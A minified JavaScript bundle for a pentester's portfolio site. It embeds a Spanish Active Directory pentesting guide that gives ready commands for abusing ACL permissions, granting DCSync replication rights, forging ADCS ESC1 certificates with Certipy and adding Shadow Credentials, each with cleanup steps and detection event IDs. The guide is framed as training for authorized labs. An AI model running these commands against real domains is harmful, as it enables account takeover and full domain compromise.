i=`0123456789ABCDEF/\\:<>[]{}*+-`[Math.floor(Math.random()*28)];n.fillStyle=Math.random()>.92?`#89E900`:`#3d463d`,n.fillText(i,t*13,e*13),r[t]=e*13>a&&Math.random()>.975?0:e+1}))};return c(),window.addEventListener(`resize`,c),o=requestAnimationFrame(l),()=>{cancelAnimationFrame(o),window.removeEventListener(`resize`,c)}},[]),(0,A.jsx)(`canvas`,{ref:t,className:`matrix-canvas`,style:{position:`absolute`,top:0,left:0,width:`100%`,height:`100%`,pointerEvents:`none`,zIndex:0,opacity:e},"aria-hidden":`true`})}var sr={github:`https://github.com/bitsofalber`,linkedin:`https://www.linkedin.com/in/ahidalgotech`,email:`albertohidalgomoreno@gmail.com`},cr=[`Café, terminal y a por ello ☕`,`Root primero, preguntas después`,`Enumera, explota, repite 🔄`,`Toda flag empieza por un buen escaneo 🔍`,`Modo auditoría activado`,`Preparando OSCP 🎯`,`Fundador de Tech4U Academy`,`eJPTv2 Certified Pentester`,`Menos teoría y más terminal`,`Active Directory & Web Security`],j={firstName:`Alberto`,lastName:`Hidalgo`,handle:`bitsofalber`,avatarText:`AH`,avatarImage:`/profile.jpeg`,role:{es:`Junior Penetration Tester | eJPTv2 | OSCP Candidate | ASIR | tech4u Founder`,en:`Junior Penetration Tester | eJPTv2 | OSCP Candidate | ASIR | tech4u Founder`},tagline:{es:`Seguridad ofensiva, auditorías de infraestructura y desarrollo de laboratorios prácticos.`,en:`Offensive security, infrastructure auditing, and hands-on lab development.`},motto:{es:`When something is important enough you do it even if the odds are not in your favor`,en:`When something is important enough you do it even if the odds are not in your favor`},mottoAuthor:`Elon Musk`,bio:[{es:`Soy estudiante de Administración de Sistemas Informáticos en Red (ASIR), con especial interés en la seguridad ofensiva, el pentesting y la infraestructura.`,en:`I am a Network Systems Administration (ASIR) student with a particular interest in offensive security, pentesting, and infrastructure.`},{es:`Cuento con la certificación eJPTv2 de INE Security y actualmente me encuentro en preparación activa de la OSCP (OffSec), complementando con laboratorios prácticos y entornos Active Directory.`,en:`I hold the eJPTv2 certification from INE Security and am actively preparing for the OSCP (OffSec), complemented by hands-on labs and Active Directory environments.`},{es:`Fundador de Tech4U Academy, una plataforma y comunidad orientada a la formación práctica en ciberseguridad con contenedores Docker y máquinas vulnerables.`,en:`Founder of Tech4U Academy, a platform and community focused on hands-on cybersecurity training with Docker containers and vulnerable machines.`},{es:`Mi enfoque combina la mentalidad analítica del Red Team con sólidos fundamentos de sistemas Linux y Windows para documentar hallazgos con rigor técnico.`,en:`My approach blends a Red Team analytical mindset with solid Linux and Windows systems fundamentals to technically document findings with rigor.`}],based:{es:`España · Remoto / Híbrido`,en:`Spain · Remote / Hybrid`}},lr=[{key:`red`,label:{es:`Red Team / Pentesting`,en:`Red Team / Pentesting`},color:`#89E900`,items:[{name:`Web Pentesting (OWASP Top 10)`},{name:`Active Directory Enumeration & Attacks`},{name:`Nmap & Network Recon`},{name:`SQL Injection / XSS / LFI / RFI`},{name:`Privilege Escalation (Linux & Windows)`},{name:`Metasploit & Custom Exploitation`},{name:`Burp Suite & Ffuf`}]},{key:`blue`,label:{es:`Blue Team & Detección`,en:`Blue Team & Detection`},color:`#8da0b0`,items:[{name:`Splunk SIEM`},{name:`MITRE ATT&CK Mapping`},{name:`Alert Triage & Incident Handling`},{name:`Sysmon & Log Analysis`},{name:`Wazuh EDR & Monitoring`}]},{key:`sys`,label:{es:`Sistemas & Infraestructura`,en:`Systems & Infrastructure`},color:`#c99e58`,items:[{name:`Linux (Debian, Arch, Ubuntu Server)`},{name:`Docker & Container Hardening`},{name:`Windows Server & Active Directory`},{name:`Bash & Python Scripting`},{name:`Networking (TCP/IP, VLANs, Firewalls)`}]}],ur=[{slug:`tech4u-academy`,title:`Tech4U Academy`,initials:`T4U`,status:`active`,featured:!0,link:`https://github.com/bitsofalber`,desc:{es:`Academia de ciberseguridad fundada por mí: infraestructura basada en contenedores Docker y laboratorios prácticos con máquinas vulnerables personalizadas para estudiantes y entusiastas del hacking.`,en:`Cybersecurity academy I founded: Docker-based infrastructure and hands-on labs with customized vulnerable machines for students and hacking enthusiasts.`},metrics:{es:`Plataforma comunitaria de labs`,en:`Community hands-on lab platform`},tags:[`Docker`,`Vulnerable Labs`,`Pentesting`,`Linux`,`Education`]},{slug:`hybrid-soc-lab`,title:`Hybrid SOC Lab`,initials:`SOC`,status:`progress`,featured:!0,link:`https://github.com/bitsofalber`,desc:{es:`Laboratorio de arquitectura híbrida de monitorización y detección con SIEM (Splunk/Elastic), EDR y NDR. Simulación de ataques avanzados y validación de casos de uso de detección con MITRE ATT&CK.`,en:`Hybrid monitoring and detection architecture lab with SIEM (Splunk/Elastic), EDR, and NDR. Simulation of advanced attacks and detection use cases aligned with MITRE ATT&CK.`},metrics:{es:`En desarrollo activo`,en:`Active development`},tags:[`SIEM`,`EDR`,`Splunk`,`MITRE ATT&CK`,`Threat Hunting`]}],dr=[{name:`eJPTv2`,full:`eLearnSecurity Junior Penetration Tester v2`,issuer:`INE Security`,state:`verified`,score:`Aprobado`,date:`2025`,color:`#89E900`,verify:`https://verified.ine.com/`,topics:[`Assessment Methodologies`,`Host & Network Auditing`,`Host & Network Penetration Testing`,`Web Application Pentesting`]},{name:`OSCP`,full:`Offensive Security Certified Professional (PEN-200)`,issuer:`OffSec`,state:`preparing`,score:`Roadmap activo`,date:`En progreso`,color:`#c99e58`,topics:[`PEN-200 Syllabus`,`Active Directory Domain Compromise`,`Custom Exploits & Pivoting`,`Client-side Attacks`]}],fr={degree:{es:`Administración de Sistemas Informáticos en Red (ASIR)`,en:`Network Systems Administration (ASIR)`},school:`FP Euroformac`,period:{es:`2025 – Actualidad`,en:`2025 – Present`},highlights:[{es:`Implantación y administración de sistemas operativos Linux y Windows Server`,en:`Deployment and administration of Linux and Windows Server operating systems`},{es:`Gestión de servicios de red, seguridad perimetral y virtualización`,en:`Management of network services, perimeter security and virtualization`},{es:`Administración de bases de datos y lenguajes de script`,en:`Database administration and scripting languages`}]},pr={role:{es:`Vigilante de Seguridad`,en:`Security Officer`},company:`Viten Seguridad y Transportes Blindados S.A.`,period:`2018 – 2026`,items:[{es:`Aplicación estricta de protocolos de seguridad física y control de accesos críticos.`,en:`Strict application of physical security protocols and critical access control.`},{es:`Vigilancia preventiva, evaluación continua de vectores de riesgo y gestión de incidentes.`,en:`Preventive surveillance, continuous assessment of risk vectors and incident management.`},{es:`Toma de decisiones bajo presión y coordinación operativa con fuerzas de seguridad.`,en:`Decision making under pressure and operational coordination with security forces.`}]},mr=[{slug:`thehackerslabs-chimichurri`,title:`Chimichurri`,platform:`TheHackersLabs`,os:`windows`,difficulty:`easy`,date:`22/10/2026`,rating:5,score:6,avatar:`/images/writeups/chimichurri.png`,avatarTheme:`green`,summary:{es:`De Jenkins a la escalada de privilegios en Windows`,en:`From Jenkins to privilege escalation on Windows`},tags:[`TheHackersLabs`,`Jenkins`,`Active Directory`,`WinRM`,`Privilege Escalation`,`Windows`],url:`https://medium.com/@albertohidalgomoreno/the-hackers-labs-chimichurri-de-jenkins-a-la-escalada-de-privilegios-en-windows-b137607dfcdd`},{slug:`dockerlabs-chmod-4755`,title:`chmod 4755`,platform:`Dockerlabs`,os:`linux`,difficulty:`medium`,date:`14/10/2026`,rating:5,score:6,avatar:`/images/writeups/chmod-4755.png`,avatarTheme:`green`,summary:{es:`De la enumeración SMB a la escalada de privilegios en Linux`,en:`From SMB enumeration to privilege escalation on Linux`},tags:[`Dockerlabs`,`SMB`,`SUID`,`chmod 4755`,`Privilege Escalation`,`Linux`],url:`https://medium.com/@albertohidalgomoreno/dockerlabs-chmod-4755-de-la-enumeraci%C3%B3n-smb-a-la-escalada-de-privilegios-en-linux-af7cd1db7282`}],hr=[{path:`/`,label:{es:`Inicio`,en:`Home`},icon:`terminal`,color:`#89E900`,code:`01`},{path:`/pentesting`,label:{es:`Pentesting / Docs`,en:`Pentesting / Docs`},icon:`book`,color:`#89E900`,code:`02`},{path:`/projects`,label:{es:`Proyectos`,en:`Projects`},icon:`briefcase`,color:`#89E900`,code:`03`},{path:`/achievements`,label:{es:`Certificaciones`,en:`Certifications`},icon:`target`,color:`#89E900`,code:`04`},{path:`/writeups`,label:{es:`Writeups`,en:`Writeups`},icon:`document`,color:`#89E900`,code:`05`},{path:`/about`,label:{es:`Acerca de`,en:`About`},icon:`user`,color:`#89E900`,code:`06`},{path:`/contact`,label:{es:`Contacto`,en:`Contact`},icon:`mail`,color:`#89E900`,code:`07`}],gr={loading:{es:`Inicializando sesión segura...`,en:`Initializing secure session...`},menu:{es:`Menú`,en:`Menu`},closeMenu:{es:`Cerrar`,en:`Close`},switchLang:{es:`Switch to English`,en:`Cambiar a español`},openToWork:{es:`Open to Work`,en:`Open to Work`},searchPlaceholder:{es:`Buscar técnicas, proyectos o writeups... (⌘K)`,en:`Search techniques, projects or writeups... (⌘K)`},dragHint:{es:`Arrastra para girar`,en:`Drag to rotate`},comingSoon:{es:`Próximamente`,en:`Coming soon`},status:{active:{es:`Activo`,en:`Active`},progress:{es:`En curso`,en:`In progress`},planned:{es:`Planificado`,en:`Planned`}},cert:{verified:{es:`Certificado oficial`,en:`Official Certified`},progress:{es:`En progreso`,en:`In progress`},preparing:{es:`Preparación activa`,en:`Actively preparing`}},copy:{es:`Copiar email`,en:`Copy email`},copied:{es:`¡Email copiado al portapapeles!`,en:`Email copied to clipboard!`},quickAccess:{es:`Acceso Rápido`,en:`Quick Access`},viewAll:{es:`Ver todo`,en:`View all`}};function _r({phrases:e=cr,speed:t=65,pause:n=2200}){let[r,i]=(0,u.useState)(``),[a,o]=(0,u.useState)(0),[s,c]=(0,u.useState)(!1);return(0,u.useEffect)(()=>{let l=e[a%e.length],u;return s?r.length>0?u=setTimeout(()=>{i(l.slice(0,r.length-1))},t/2):(c(!1),o(t=>(t+1)%e.length)):u=r.length<l.length?setTimeout(()=>{i(l.slice(0,r.length+1))},t):setTimeout(()=>{c(!0)},n),()=>clearTimeout(u)},[r,s,a,e,t,n]),(0,A.jsxs)(`span`,{className:`typewriter-container`,children:[(0,A.jsx)(`span`,{className:`typewriter-text`,children:r}),(0,A.jsx)(`span`,{className:`hx-caret`,"aria-hidden":`true`})]})}var vr=`> **Active Directory Pentesting.** No un listado de herramientas, sino un **manual de razonamiento** para atacar y evaluar un dominio: enumerar → entender el contexto → formular hipótesis → validar → explotar → escalar → moverse lateralmente → conseguir *Domain Dominance* → documentar y limpiar.

Guía orientada a OSCP, CTFs, laboratorios (HTB, VulnLab, Pro Labs) y **pentesting interno autorizado**. Cada técnica sigue la lógica: *¿qué tengo? → ¿qué significa? → ¿qué enumero? → ¿qué fallo de configuración existe? → ¿qué herramienta y comando uso? → ¿qué resultado espero? → ¿qué significa? → siguiente paso*.

La regla mental de toda la sección:

\`\`\`text
He encontrado X → ¿qué significa X y qué puedo comprobar ahora?
\`\`\`

> Todo el contenido es para **entornos autorizados / laboratorio**. Las técnicas destructivas, de persistencia o de evasión se marcan explícitamente y se acompañan de su *cleanup*. Las credenciales y accesos solo se prueban dentro del alcance.

***

## Ruta de estudio

\`\`\`text
Introducción → Metodología → Enumeración → LDAP → SMB/SYSVOL
   → Kerberos → Password Attacks → BloodHound
   → ACL/ACE → GPO → Delegation → Credential Dumping/DCSync
   → NTLM Relay/Coercion → ADCS → Tickets → Lateral Movement
   → MSSQL/Trusts → Persistence/OPSEC → Attack Paths → Quick Reference
\`\`\`

Esta categoría **no duplica** otras secciones: la metodología completa de SMB vive en [Servicios y Puertos → SMB](/pentesting/services/puertos-139-445-smb), la enumeración de Linux en [Linux](/pentesting/linux/introduccion) y la escalada local en [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux). Aquí se cubre lo específico de **Active Directory** y se enlaza al resto.
`,yr=`Las ACLs (Access Control Lists) de Active Directory controlan quién puede leer o modificar cada objeto del directorio, y con frecuencia contienen permisos mal configurados que permiten escalar privilegios sin tocar ninguna vulnerabilidad de software. Esta página cubre cómo identificar y explotar esos permisos abusables.

## Conceptos

- **ACL (Access Control List)** — la lista completa de reglas de acceso asociada a un objeto de AD (un usuario, grupo, equipo, GPO, OU...).
- **ACE (Access Control Entry)** — cada entrada individual dentro de una ACL; define un permiso concreto (p. ej. \`GenericAll\`) concedido a un principal sobre ese objeto.
- **Object** — el objeto del directorio protegido por la ACL (el *target*): un usuario, grupo, equipo, GPO, etc.
- **Principal** — la entidad que recibe el permiso: un usuario, grupo o equipo.
- **Permission** — el derecho concreto que una ACE concede (control total, escritura de un atributo, cambio de propietario...).
- **Inheritance (herencia)** — las ACEs definidas en una OU pueden heredarse a los objetos contenidos en ella; un permiso abusable en una OU puede afectar a todos los usuarios o equipos que cuelgan de ella.

***

## Permisos abusables

| Permiso | Impacto |
| --- | --- |
| \`GenericAll\` | Control completo sobre el objeto: cambiar contraseña, añadir a grupos, modificar cualquier atributo |
| \`GenericWrite\` | Modificación de atributos del objeto (p. ej. \`scriptPath\`, \`servicePrincipalName\`, \`msDS-KeyCredentialLink\`) |
| \`WriteOwner\` | Permite cambiar el propietario del objeto, y desde ahí concederse cualquier otro permiso |
| \`WriteDacl\` | Permite modificar la propia ACL del objeto, añadiendo una ACE con el permiso que se desee |
| \`ForceChangePassword\` | Permite cambiar la contraseña de un usuario sin conocer la actual |
| \`AddMember\` | Permite añadir miembros (incluido uno mismo) a un grupo |

***

## Identificar permisos

**Desde Windows (PowerView)**

\`\`\`powershell
Get-ObjectAcl -Identity <target> -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
\`\`\`

**Desde Linux / grafo**

- BloodHound — las aristas ACL (ver [bloodhound](/pentesting/active-directory/bloodhound)) son la forma más rápida de localizar estos permisos a escala de todo el dominio.
- \`dacledit.py\` (Impacket) — lectura y escritura de ACEs concretas.
- \`bloodyAD\`:

\`\`\`bash
bloodyAD --host <dc-ip> -d <dominio> -u <usuario> -p <password> get writable
\`\`\`

***

## POCs

> **Solo laboratorio / entorno autorizado.** Todas las técnicas siguientes modifican objetos del directorio (contraseñas, membresías, ACLs, propietarios). Ejecútalas únicamente con autorización expresa y revierte el cambio al terminar (sección Cleanup de cada POC).

### GenericAll sobre un usuario

**Situación.** El usuario comprometido tiene \`GenericAll\` sobre otra cuenta de usuario (visible en BloodHound o con \`Get-ObjectAcl\`).

**Enumeración.** Confirmar el edge \`GenericAll\` en BloodHound o listar las ACEs del objeto target.

**Confirmación.** Verificar con \`Get-ObjectAcl -Identity <target> -ResolveGUIDs\` (Windows) o \`bloodyAD ... get writable\` (Linux) que el permiso sigue vigente.

**Abuso.** La vía más directa es forzar un cambio de contraseña:

**Desde Linux**

\`\`\`bash
net rpc password "<target>" "NewPass123!" -U "<dominio>/<usuario>%<password>" -S <dc-ip>
\`\`\`

o con bloodyAD:

\`\`\`bash
bloodyAD --host <dc-ip> -d <dominio> -u <usuario> -p <password> set password <target> 'NewPass123!'
\`\`\`

**Desde Windows**

\`\`\`powershell
Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
\`\`\`

Alternativas con \`GenericAll\` sobre un usuario: Targeted Kerberoasting (ver [kerberos](/pentesting/active-directory/kerberos)) o Shadow Credentials (ver [adcs](/pentesting/active-directory/adcs)), útiles cuando no se quiere tocar la contraseña del usuario.

**Resultado.** Control total de la cuenta \`<target>\` con la nueva contraseña.

**Interpretación.** El atacante ahora puede autenticarse como \`<target>\` y heredar cualquier privilegio que esa cuenta tuviera.

**Cleanup.** Restaurar la contraseña original si se conoce, o documentar el cambio para que el propietario legítimo la restablezca al finalizar el ejercicio.

**Detección.** Evento 4724/4738 (cambio/reset de contraseña) con un actor distinto del propietario habitual.

***

### GenericAll sobre un grupo

**Situación.** El usuario comprometido tiene \`GenericAll\` sobre un grupo (p. ej. un grupo con privilegios indirectos sobre un recurso).

**Enumeración.** Confirmar el edge \`GenericAll\` sobre el grupo en BloodHound.

**Confirmación.** \`Get-ObjectAcl -Identity <grupo> -ResolveGUIDs\` o \`bloodyAD ... get writable\`.

**Abuso.** Añadirse como miembro del grupo:

**Desde Linux**

\`\`\`bash
net rpc group addmem "<grupo>" "<usuario>" -U "<dominio>/<usuario>%<password>" -S <dc-ip>
\`\`\`

o:

\`\`\`bash
bloodyAD --host <dc-ip> -d <dominio> -u <usuario> -p <password> add groupMember <grupo> <usuario>
\`\`\`

**Desde Windows**

\`\`\`powershell
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario>'
\`\`\`

**Resultado.** El usuario pasa a formar parte de \`<grupo>\`, heredando sus privilegios.

**Interpretación.** Si \`<grupo>\` tiene a su vez \`AdminTo\`, \`CanRDP\` o pertenencia a grupos privilegiados, esto habilita movimiento lateral o escalada (ver [lateral-movement](/pentesting/active-directory/lateral-movement)).

**Cleanup.** Eliminar al usuario del grupo (\`Remove-DomainGroupMember\` / \`net rpc group delmem\`).

**Detección.** Evento 4728/4732/4756 (añadir miembro a grupo con ámbito de seguridad/distribución).

***

### GenericWrite sobre un usuario

**Situación.** El usuario comprometido tiene \`GenericWrite\` sobre otra cuenta de usuario, permitiendo modificar atributos pero no necesariamente todos los permisos de \`GenericAll\`.

**Enumeración.** Confirmar el edge \`GenericWrite\` en BloodHound.

**Confirmación.** \`Get-ObjectAcl -Identity <target> -ResolveGUIDs\`.

**Abuso.** Dos vías principales:

- **Targeted Kerberoasting** — añadir temporalmente un SPN a la cuenta target para forzar que sea kerberoasteable (ver [kerberos](/pentesting/active-directory/kerberos)).
- **Shadow Credentials** — escribir en \`msDS-KeyCredentialLink\` para autenticarse como el usuario sin conocer su contraseña (ver [adcs](/pentesting/active-directory/adcs)).

**Resultado.** Obtención de un hash crackeable (Kerberoast) o de un certificado que permite autenticarse como \`<target>\` (Shadow Credentials).

**Interpretación.** \`GenericWrite\` no permite cambiar la contraseña directamente como \`GenericAll\`, pero sí abrir vías equivalentes modificando atributos específicos.

**Cleanup.** Quitar el SPN añadido o eliminar la entrada añadida en \`msDS-KeyCredentialLink\`.

**Detección.** Evento 5136 (modificación de atributo de objeto de directorio) sobre \`servicePrincipalName\` o \`msDS-KeyCredentialLink\`.

***

### WriteOwner

**Situación.** El usuario comprometido tiene \`WriteOwner\` sobre un objeto, permitiendo tomar su propiedad.

**Enumeración.** Confirmar el edge \`WriteOwner\` en BloodHound.

**Confirmación.** \`Get-ObjectAcl -Identity <target> -ResolveGUIDs\`.

**Abuso.** Tomar la propiedad del objeto y luego concederse derechos sobre él:

**Desde Windows**

\`\`\`powershell
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <usuario>
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <usuario> -Rights All
\`\`\`

**Desde Linux**

\`\`\`bash
owneredit.py -action write -new-owner <usuario> -target <target> '<dominio>/<usuario>:<password>'
\`\`\`

(seguido de \`dacledit.py\` para concederse los derechos, ver sección WriteDACL).

**Resultado.** El usuario pasa a ser propietario de \`<target>\` y, desde ahí, puede concederse cualquier permiso adicional sobre el objeto.

**Interpretación.** \`WriteOwner\` es un paso intermedio: por sí solo no da control del objeto, pero permite escalar a \`WriteDacl\` y de ahí a \`GenericAll\`.

**Cleanup.** Restaurar el propietario original del objeto.

**Detección.** Evento 4670 (cambio de permisos) y cambios en el atributo \`nTSecurityDescriptor\`.

***

### WriteDACL

**Situación.** El usuario comprometido tiene \`WriteDacl\` sobre un objeto, permitiendo modificar su ACL directamente.

**Enumeración.** Confirmar el edge \`WriteDacl\` en BloodHound.

**Confirmación.** \`Get-ObjectAcl -Identity <target> -ResolveGUIDs\`.

**Abuso.** Concederse derechos completos sobre el objeto:

**Desde Windows**

\`\`\`powershell
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <usuario> -Rights All
\`\`\`

**Desde Linux**

\`\`\`bash
dacledit.py -action write -rights FullControl -principal <usuario> -target <target> '<dominio>/<usuario>:<password>'
\`\`\`

**Resultado.** El usuario obtiene \`GenericAll\` (u otro derecho elegido) sobre \`<target>\`, pudiendo aplicar cualquiera de los abusos anteriores.

**Interpretación.** \`WriteDacl\` es equivalente en la práctica a poder convertir cualquier otro permiso en el que se necesite sobre el objeto.

**Cleanup.** Eliminar la ACE añadida con \`dacledit.py -action remove\` (o \`Remove-DomainObjectAcl\`).

**Detección.** Evento 4670 y 5136 sobre el atributo \`nTSecurityDescriptor\` del objeto.

***

### DCSync Rights

**Situación.** El usuario comprometido tiene (o puede concederse) \`WriteDacl\`/\`GenericAll\` sobre el objeto dominio, permitiendo otorgarse los derechos de replicación necesarios para un DCSync.

**Enumeración.** Confirmar el edge \`DCSync\` o permisos ACL sobre el objeto dominio en BloodHound.

**Confirmación.** \`Get-ObjectAcl -Identity "<dominio>" -ResolveGUIDs\`, buscando \`DS-Replication-Get-Changes\` y \`DS-Replication-Get-Changes-All\`.

**Abuso.** Conceder los derechos de replicación sobre el objeto dominio y ejecutar un DCSync (ver [DCSync](/pentesting/active-directory/dcsync) para el comando de extracción):

**Desde Windows**

\`\`\`powershell
Add-DomainObjectAcl -TargetIdentity "<dominio>" -PrincipalIdentity <usuario> -Rights DCSync
\`\`\`

**Desde Linux**

\`\`\`bash
dacledit.py -action write -rights DCSync -principal <usuario> -target-dn "DC=<dominio>,DC=..." '<dominio>/<usuario>:<password>'
\`\`\`

**Resultado.** El usuario queda habilitado para ejecutar un DCSync y extraer los hashes de cualquier cuenta del dominio, incluido \`krbtgt\`.

**Interpretación.** Este es uno de los finales más comunes de un attack path: una vez con derechos de replicación, el compromiso del dominio es total.

**Cleanup.** Eliminar los derechos \`DS-Replication-Get-Changes\`/\`-All\` añadidos.

**Detección.** Evento 4662 con los GUID de \`DS-Replication-Get-Changes\` / \`DS-Replication-Get-Changes-All\` sobre el objeto dominio, originado desde un host que no es un DC.
`,br=`Active Directory Certificate Services (ADCS) añade una PKI (Public Key Infrastructure) al dominio. Mal configurada, una Certificate Authority (CA) empresarial puede convertirse en una vía directa de escalada de privilegios o persistencia, ya que un certificado válido permite autenticarse como cualquier usuario del dominio.

## ¿Qué es ADCS?

ADCS es el rol de Windows Server que implementa una PKI integrada con Active Directory. Los componentes clave son:

- **CA (Certificate Authority)**: el servidor que emite certificados. Puede ser *Enterprise CA* (integrada en AD, publica plantillas vía LDAP) o *Standalone CA*.
- **Certificate Template**: una plantilla que define qué puede pedir un usuario (uso del certificado, quién puede solicitarlo, si el solicitante puede especificar el Subject Alternative Name, etc.).
- **Enrollment**: el proceso de solicitar y obtener un certificado firmado por la CA, normalmente a través de RPC/DCOM, el servicio web de inscripción (\`certsrv\`), o \`certreq\`.
- **PKINIT**: extensión de Kerberos que permite autenticarse en el \`AS-REQ\` usando un certificado X.509 en lugar de una contraseña o un hash. El DC valida el certificado y devuelve un TGT.
- **Authentication Certificate**: un certificado emitido con el uso extendido *Client Authentication*, que es el que habilita PKINIT.

La idea central del abuso de ADCS es: si se puede obtener un certificado de autenticación válido para una cuenta (por configuración débil de la plantilla, de la CA, o de permisos sobre objetos), ese certificado permite obtener un TGT mediante PKINIT y, en muchos casos, derivar el NT hash de la cuenta.

***

## Enumeración

> **Solo laboratorio / entorno autorizado.** Las técnicas de esta página solo deben ejecutarse en infraestructura propia o con autorización explícita.

**Desde Linux (Impacket/Certipy)**

\`\`\`bash
# Enumeración general de la PKI del dominio
certipy find -u <usuario>@<dominio> -p '<password>' -dc-ip <dc-ip>

# Enumeración centrada en plantillas y configuraciones vulnerables conocidas
certipy find -u <usuario>@<dominio> -p '<password>' -dc-ip <dc-ip> -vulnerable
\`\`\`

**Desde Windows (Certify/PSPKIAudit)**

\`\`\`powershell
Certify.exe find /vulnerable
Invoke-PSPKIAudit
\`\`\`

### Enumeration

Identificar las CAs publicadas en el dominio, las plantillas disponibles (\`msPKI-Certificate-Name-Flag\`, \`msPKI-Enrollment-Flag\`, \`pKIExtendedKeyUsage\`) y quién tiene permisos de enrollment sobre cada una.

### Misconfiguration

A partir de la salida de \`certipy find -vulnerable\`, identificar plantillas o configuraciones de CA que coincidan con alguno de los escenarios ESC. **No asumir vulnerabilidad por la mera presencia de una plantilla**: hay que confirmar los flags concretos.

### Exploitation

Solicitar el certificado abusando de la configuración identificada (ver sección ESC más abajo).

### Authentication

Usar el certificado obtenido para autenticarse vía PKINIT y extraer el TGT / NT hash resultante.

### Cleanup

Si la explotación requirió modificar un objeto AD (plantilla, ACL), revertir el cambio. Ver detalle en ESC4 más abajo.

***

## Escenarios de abuso (ESC)

ADCS tiene varias configuraciones inseguras conocidas, catalogadas como ESC1 a ESC8 (y ampliaciones posteriores). **No todas las instalaciones de ADCS son vulnerables, y no todas las versiones de Windows Server ni todas las plantillas se comportan igual.** El hecho de que exista una plantilla personalizada, o incluso que su nombre suene sospechoso, no implica que sea explotable: siempre hay que confirmar los flags concretos con \`certipy find -vulnerable\` u otra herramienta equivalente antes de intentar nada.

### ESC1 (ejemplo detallado)

**¿Qué es?** Una plantilla que permite que el solicitante especifique libremente el Subject Alternative Name (SAN) (\`ENROLLEE_SUPPLIES_SUBJECT\`), que habilita Client Authentication, y para la que un usuario de bajo privilegio tiene permisos de enrollment.

**¿Por qué funciona?** El certificado resultante puede contener un SAN arbitrario (por ejemplo, el UPN de \`administrator\`), y como habilita autenticación de cliente, puede usarse vía PKINIT para obtener un TGT en nombre de esa identidad.

**Requisitos**

- Credenciales válidas de un usuario con permiso de enrollment sobre la plantilla vulnerable.
- La plantilla tiene \`ENROLLEE_SUPPLIES_SUBJECT\` + EKU de Client Authentication (o similar) + no requiere aprobación de manager.
- Conectividad con la CA y el DC.

**Enumeración/Confirmación**

\`\`\`bash
certipy find -u <usuario>@<dominio> -p '<password>' -dc-ip <dc-ip> -vulnerable
\`\`\`

Confirmar en la salida que la plantilla aparece marcada como \`ESC1\`.

**POC**

\`\`\`bash
certipy req -u <usuario>@<dominio> -p '<password>' \\
  -ca <ca> -template <template> \\
  -upn administrator@<dominio> -dc-ip <dc-ip>
\`\`\`

Esto genera \`administrator.pfx\`. Autenticarse con él:

\`\`\`bash
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
\`\`\`

**Resultado esperado**

\`\`\`text
Certipy v4.x.x
[*] Requesting certificate via PKINIT
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@<dominio>': aad3b435b51404eeaad3b435b51404ee:<nt_hash>
\`\`\`

**Interpretación**

Se obtiene un TGT válido como \`administrator\` y, en la mayoría de los casos, su NT hash. Con ese hash es posible hacer Pass-the-Hash o, si la cuenta tiene privilegios de replicación, usarlo como punto de partida para un DCSync (ver [DCSync](/pentesting/active-directory/dcsync) y [lateral-movement](/pentesting/active-directory/lateral-movement)).

**Siguiente paso**: usar el TGT/NT hash para movimiento lateral o para escalar a Domain Admin si la cuenta objetivo ya lo era.

**Cleanup**: ESC1 no modifica objetos del AD (solo solicita un certificado), por lo que normalmente no requiere limpieza más allá de revocar el certificado emitido si la política del entorno lo exige.

**Detección**: eventos de emisión de certificados en la CA (Event ID 4886/4887), solicitudes con SAN que no coincide con la identidad del solicitante.

**Si falla…**: comprobar que la plantilla sigue publicada (\`certipy find\` puede ir desfasado respecto a cambios recientes) y que la cuenta usada realmente tiene permiso de enrollment.

### Otros escenarios (resumen)

- **ESC4**: el atacante tiene control (\`GenericWrite\`/\`WriteOwner\`/etc., ver [acl-ace](/pentesting/active-directory/acl-ace)) sobre el objeto de la plantilla en AD, lo que permite reconfigurarla temporalmente para hacerla vulnerable a ESC1 y luego restaurarla.
- **ESC8**: el servicio web de inscripción de la CA (\`certsrv\`) acepta autenticación NTLM sobre HTTP, lo que permite relayar una autenticación NTLM capturada (ver [ntlm-coercion](/pentesting/active-directory/ntlm-coercion)) directamente contra la interfaz de enrollment para obtener un certificado.

> **Cleanup.** Si se usó ESC4 y se modificó una plantilla existente para hacerla explotable, restaurar los valores originales de los atributos modificados (\`msPKI-Certificate-Name-Flag\`, ACL, etc.) en cuanto se termine la prueba.

***

## Shadow Credentials

**¿Qué es?** Técnica que abusa del atributo \`msDS-KeyCredentialLink\` de un objeto de AD para añadir un par de claves/certificado controlado por el atacante, habilitando autenticación vía PKINIT sin necesidad de ADCS.

**Requisitos**

- Permiso \`GenericWrite\` o \`GenericAll\` sobre el objeto objetivo (ver [acl-ace](/pentesting/active-directory/acl-ace)).
- Herramientas: \`pywhisker\` (Linux), \`Whisker\` o \`Rubeus\` (Windows).

\`\`\`text
Encontrar GenericWrite/GenericAll sobre el objetivo
        ↓
Añadir una KeyCredential al atributo msDS-KeyCredentialLink
        ↓
Obtener el material de clave/certificado generado
        ↓
Autenticación PKINIT con ese certificado
        ↓
TGT de la cuenta objetivo
        ↓
Escalada / movimiento lateral
\`\`\`

**POC (Linux)**

\`\`\`bash
pywhisker.py -d <dominio> -u <usuario> -p '<password>' \\
  --target <target> --action add
\`\`\`

Esto genera un certificado \`.pfx\` y un PIN. Con ellos:

\`\`\`bash
gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pin> <dominio>/<target> ticket.ccache
\`\`\`

Alternativa con Certipy:

\`\`\`bash
certipy shadow auto -u <usuario>@<dominio> -p '<password>' -account <target>
\`\`\`

**Resultado esperado**

\`\`\`text
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[*] Successfully added new KeyCredential
[*] Got TGT
[*] NT hash for <target>: <nt_hash>
\`\`\`

**Interpretación**: se obtiene un TGT y, habitualmente, el NT hash de la cuenta objetivo, sin haber tocado su contraseña.

**Siguiente paso**: usar las credenciales obtenidas para movimiento lateral o escalada adicional.

**Cleanup**

\`\`\`bash
pywhisker.py -d <dominio> -u <usuario> -p '<password>' \\
